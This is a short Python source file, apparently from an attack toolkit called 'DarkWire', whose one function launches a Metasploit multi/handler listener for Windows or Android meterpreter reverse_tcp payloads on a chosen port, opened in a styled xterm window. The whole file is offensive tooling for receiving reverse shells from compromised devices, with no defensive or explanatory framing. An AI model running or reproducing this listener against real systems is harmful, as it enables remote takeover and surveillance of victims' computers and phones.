import subprocess

def start_listener(platform, port):
    if platform == "Windows":
        payload = "windows/meterpreter/reverse_tcp"
    elif platform == "Android":
        payload = "android/meterpreter/reverse_tcp"
    else:
        payload = "windows/meterpreter/reverse_tcp"

    cmd = f'''msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST 0.0.0.0; set LPORT {port}; exploit"'''
    subprocess.Popen(["xterm", "-fa", "Monospace", "-fs", "11", "-bg", "black", "-fg", "green", "-T", "DarkWire Listener", "-e", cmd])
